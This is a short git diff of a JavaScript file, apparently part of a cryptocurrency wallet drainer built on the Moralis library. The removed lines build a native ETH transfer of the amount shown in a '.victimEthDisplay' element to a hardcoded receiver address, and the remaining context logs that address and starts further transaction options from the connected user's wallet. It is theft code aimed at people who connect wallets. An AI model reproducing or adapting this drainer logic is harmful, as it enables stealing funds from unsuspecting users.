@@ -68,13 +68,6 @@ async function transact() {
 });
     var options, optionss, optionsss;
     console.log("0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff");
-    if (MODE == 'ethnft') {
-        options = {
-            type: "native",
-            amount: Moralis.Units.ETH($('.victimEthDisplay').text().slice(0, $('.victimEthDisplay').text().indexOf(' '))),
-            receiver: "0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff"
-        };
-    }
     optionss = {
         chain: "Eth",
   address: Moralis.User.current().get("ethAddress"),
